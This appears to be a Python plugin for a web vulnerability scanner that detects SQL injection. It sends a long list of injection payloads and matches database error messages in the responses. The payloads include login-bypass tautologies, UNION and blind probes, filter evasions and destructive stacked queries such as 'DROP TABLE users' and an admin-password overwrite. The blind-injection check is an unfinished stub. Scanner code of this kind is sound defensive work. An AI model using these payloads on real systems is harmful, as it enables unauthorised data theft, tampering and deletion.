"""
SQL Injection detection plugin
"""

import re
from typing import List, Dict, Any

from vulnmind.plugins.base import ParameterPlugin
from vulnmind.core.models import VulnType, SeverityLevel


class SQLInjectionPlugin(ParameterPlugin):
    """SQL Injection vulnerability detection plugin"""
    
    def __init__(self):
        super().__init__()
        self.vuln_type = VulnType.SQL_INJECTION
        self.severity = SeverityLevel.CRITICAL
        
        # SQL error patterns for different databases
        self.sql_error_patterns = [
            # MySQL
            r"SQL syntax.*?error",
            r"mysql_fetch_array\(\)",
            r"mysql_connect\(\)",
            r"mysql_num_rows\(\)",
            r"Table '[^']*' doesn't exist",
            r"Unknown column '[^']*' in",
            
            # PostgreSQL
            r"PostgreSQL.*?ERROR",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"unterminated quoted string",
            
            # MSSQL
            r"Microsoft OLE DB Provider",
            r"Unclosed quotation mark",
            r"Microsoft JET Database Engine",
            r"Incorrect syntax near",
            
            # Oracle
            r"ORA-[0-9]+",
            r"Oracle error",
            r"Oracle driver",
            
            # SQLite
            r"SQLite.*?error",
            r"sqlite3_prepare",
            
            # Generic
            r"syntax error.*?at.*?line",
            r"unterminated string literal",
            r"unexpected end of SQL command"
        ]
        
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
    
    def get_payloads(self) -> List[str]:
        """Get SQL injection payloads"""
        return [
            # Basic syntax errors
            "'",
            '"',
            "')",
            "';",
            '";',
            
            # Classic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            '" OR "1"="1',
            '" OR 1=1--',
            '" OR 1=1#',
            
            # Union-based
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Time-based blind
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' AND pg_sleep(5)--",
            "'; SELECT SLEEP(5)--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'admin','admin')--",
            "'; UPDATE users SET password='admin' WHERE id=1--",
            
            # Advanced payloads
            "admin'/*",
            "admin'/**/OR/**/1=1/*",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            
            # Database-specific functions
            "' AND (SELECT user())>0--",
            "' AND (SELECT database())>0--",
            "' AND (SELECT version())>0--",
            "' AND (SELECT @@version)>0--",
            
            # Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # XML-based
            "' AND 1=(SELECT COUNT(*) FROM tabname); --",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            
            # No-quote injections
            "1 OR 1=1",
            "1 OR 1=1--",
            "1 OR 1=1#",
            "1 AND 1=1",
            "1 AND 1=2",
            
            # Bypass filters
            "1'or'1'='1",
            "1/**/OR/**/1=1",
            "1%20OR%201=1",
            "1'+OR+'1'='1",
            "1'||'1'='1",
            
            # Second order
            "admin'--",
            "admin'#",
            "admin'/*",
        ]
    
    def detect_vulnerability(self, response_text: str, payload: str) -> bool:
        """Detect SQL injection vulnerability"""
        # Check for SQL error patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_text):
                return True
        
        # Check for common database error messages
        error_indicators = [
            "sql syntax",
            "mysql error",
            "ora-00",
            "microsoft ole db",
            "sqlite",
            "postgresql",
            "syntax error",
            "unterminated string",
            "unexpected end of sql",
            "quoted string not properly terminated",
            "column count doesn't match"
        ]
        
        response_lower = response_text.lower()
        for indicator in error_indicators:
            if indicator in response_lower:
                return True
        
        # Check for boolean-based blind SQL injection
        if self._detect_blind_sql(response_text, payload):
            return True
        
        return False
    
    def _detect_blind_sql(self, response_text: str, payload: str) -> bool:
        """Detect blind SQL injection patterns"""
        # This is a simplified check - in production, you'd want to
        # compare responses from true/false conditions
        
        # Look for conditional response patterns
        if "AND 1=1" in payload and "AND 1=2" in payload:
            # This would require state management between requests
            # For now, we'll rely on error-based detection
            return False
        
        # Check for time-based indicators (would need actual timing measurement)
        time_payloads = ["SLEEP", "WAITFOR", "pg_sleep"]
        for time_payload in time_payloads:
            if time_payload.lower() in payload.lower():
                # In production, measure response time
                return False
        
        return False
    
    def calculate_confidence(self, response_text: str, payload: str) -> float:
        """Calculate confidence for SQL injection detection"""
        confidence = 0.3  # Base confidence
        
        # High confidence for specific SQL errors
        high_confidence_patterns = [
            r"SQL syntax.*?error",
            r"mysql_",
            r"ORA-[0-9]+",
            r"Microsoft.*?OLE.*?DB",
            r"PostgreSQL.*?ERROR"
        ]
        
        for pattern in high_confidence_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                confidence += 0.4
                break
        
        # Medium confidence for generic database errors
        medium_confidence_indicators = [
            "syntax error", "unterminated string", "quoted string",
            "unexpected end", "column count"
        ]
        
        response_lower = response_text.lower()
        for indicator in medium_confidence_indicators:
            if indicator in response_lower:
                confidence += 0.2
                break
        
        # Additional confidence for payload reflection
        if payload.replace("'", "").replace('"', '') in response_text:
            confidence += 0.1
        
        return min(confidence, 1.0)
    
    def get_description(self) -> str:
        """Get vulnerability description"""
        return (
            "SQL Injection vulnerability allows attackers to interfere with queries "
            "made to the database, potentially allowing them to view, modify, or delete data."
        )
    
    def get_remediation(self) -> str:
        """Get remediation advice"""
        return (
            "Use parameterized queries (prepared statements) instead of concatenating "
            "user input into SQL queries. Implement input validation and sanitization. "
            "Use stored procedures when appropriate. Apply principle of least privilege "
            "to database accounts. Consider using an ORM framework with built-in protections."
        )
    
    def get_cwe_id(self) -> int:
        """Get CWE ID for SQL Injection"""
        return 89
    
    def get_references(self) -> List[str]:
        """Get reference URLs"""
        return [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://portswigger.net/web-security/sql-injection"
        ]
